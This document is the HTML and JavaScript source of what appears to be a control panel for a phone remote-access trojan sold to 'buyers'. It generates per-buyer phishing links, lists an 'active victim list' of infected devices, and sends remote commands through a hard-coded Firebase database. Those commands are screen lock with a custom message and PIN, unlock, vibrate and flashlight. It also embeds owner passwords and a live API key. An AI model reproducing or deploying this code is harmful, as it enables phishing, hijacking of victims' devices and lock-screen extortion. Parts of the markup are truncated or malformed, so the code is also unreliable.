        .login-card { background: var(--glass); border: 2px solid var(--red); padding: 30px 25px; border-radius: 0 0 25px 25px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,1); }
        input { width: 100%; padding: 15px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 12px; text-align: center; font-weight: bold; outline: none; }
        input:focus { border-color: var(--red); }
        .btn-red { background: var(--red); color: #fff; border: none; padding: 16px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; text-transform: uppercase; }

        .section-box { background: #0f0f0f; border: 1px solid #222; padding: 20px; border-radius: 25px; margin-bottom: 20px; border-left: 5px solid var(--red); }
        
        /* KHUSUS OWNER AREA */
        #owner-area { display: none; border-left: 5px solid #fff; background: #111; }
        
        /* TARGET LIST */
        .target-card { background: #080808; border: 1px solid #222; border-radius: 20px; padding: 15px; margin-bottom: 15px; border-left: 4px solid var(--red); }
        .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
        .btn-cmd { background: #1a1a1a; color: #fff; border: 1px solid #333; padding: 10px; border-radius: 10px; font-size: 11px; font-weight: bold; cursor: pointer; }
        
        /* MODAL */
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; }
        .modal-box { background: #111; width: 85%; max-width: 350px; border-radius: 30px; padding: 25px; border: 1px solid #333; text-align: center; }

<body>

            <input type="text" id="new-u-mail" placeholder="BUYER EMAIL">
            <input type="text" id="new-u-key" placeholder="BUYER KEY">
            <button onclick="createAccount()" class="btn-red" style="background:#fff; color:#000;">SAVE BUYER DATA</button>

        <div class="section-box">

            <button onclick="copyLink()" class="btn-red">📋 COPY LINK SEKARANG</button>
        </div>

        <div id="target-list-container">
            <p style="text-align:center; font-size:11px; color:#444;">-- ACTIVE VICTIM LIST --</p>
            <div id="target-list"></div>
        </div>
        <button onclick="location.reload()" style="background:none; border:none; color:#333; width:100%; margin:30px 0; cursor:pointer;">LOGOUT SESSION</button>
    </div>

    <div id="lock-modal" class="modal-overlay">
        <div class="modal-box">
            <h2 style="color:red; margin:0 0 15px 0;">HARD LOCK</h2>
            <input type="text" id="m-msg" placeholder="Pesan Layar Kunci">
            <input type="password" id="m-pin" placeholder="PIN Unlock">
            <div style="display:flex; gap:10px; margin-top:20px;">
                <button onclick="closeModal()" class="btn-cmd" style="flex:1;">BATAL</button>
                <button onclick="fireLock()" class="btn-red" style="flex:1; padding:10px;">LOCK</button>
            </div>
        </div>
    </div>

<script>
    // 🔥 FIREBASE CONFIG FULL & LENGKAP 🔥
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
      measurementId: "G-7Z9L3XN6Z9"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const targetUrl = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
    let currentKey = "", activeTid = "";

    function login() {
        const k = document.getElementById('log-key').value;
        // LOGIC ROLE OWNER (MARIO)
        if(k === "mario122" || k === "elvoxi122") {
            currentKey = k;
            document.getElementById('owner-area').style.display = 'block';
            setupPanel();
        } else {
            // LOGIC ROLE USER (BUYER)
            db.ref('mario/users/' + k).once('value', snap => {
                if(snap.exists()) {
                    currentKey = k;
                    document.getElementById('owner-area').remove(); // Hapus paksa menu create biar buyer gak bisa fomo
                    setupPanel();
                } else { alert("KEY SALAH ATAU EXPIRED!"); }
            });
        }
    }

    function setupPanel() {
        document.getElementById('phishing-link').value = targetUrl + "?id=" + btoa(currentKey);
        document.getElementById('auth-box').style.display = 'none';
        document.getElementById('main-ui').style.display = 'block';
        loadTargets();
    }

    // 🔥 TEMPAT CREATE BUYER (SAVE KE DATABASE) 🔥
    function createAccount() {
        const mail = document.getElementById('new-u-mail').value;
        const key = document.getElementById('new-u-key').value;
        if(mail && key) {
            db.ref('mario/users/' + key).set({
                email: mail,
                role: "buyer",
                createdAt: Date.now()
            }).then(() => {
                alert("SUKSES! Buyer terdaftar dengan Key: " + key);
                document.getElementById('new-u-mail').value = "";
                document.getElementById('new-u-key').value = "";
            });
        } else { alert("ISI EMAIL & KEY!"); }
    }

    function loadTargets() {
        db.ref('mario/targets').on('value', snap => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            snap.forEach(child => {
                const d = child.val();
                if(d.belongsTo === currentKey) {
                    list.innerHTML += `
                    <div class="target-card">
                        <b>📱 ${d.model}</b><br><small style="color:#444;">ID: ${child.key}</small>
                        <div class="cmd-grid">
                            <button class="btn-cmd" style="background:red;" onclick="openModal('${child.key}')">⚡ LOCK</button>
                            <button class="btn-cmd" onclick="sendCmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
                            <button class="btn-cmd" onclick="sendCmd('${child.key}', 'vibrate')">📳 VIBRATE</button>
                            <button class="btn-cmd" onclick="sendCmd('${child.key}', 'torch_on') text: 'flashlight'">🔦 FLASH</button>
                        </div>
                    </div>`;
                }
            });
        });
    }

    function sendCmd(id, act) {
        db.ref('mario/commands/' + id).set({ action: act, time: Date.now() });
        alert("Command Sent!");
    }

    function fireLock() {
        const m = document.getElementById('m-msg').value;
        const p = document.getElementById('m-pin').value;
        db.ref('mario/commands/' + activeTid).set({ action: 'lock_screen', text: m, pass: p, time: Date.now() });
        closeModal();
    }

    function openModal(id) { activeTid = id; document.getElementById('lock-modal').style.display = 'flex'; }
    function closeModal() { document.getElementById('lock-modal').style.display = 'none'; }
    
    function copyLink() {
        const inp = document.getElementById('phishing-link');
        inp.select();
        navigator.clipboard.writeText(inp.value);
        alert("LINK COPIED GACOR!");
    }
</script>
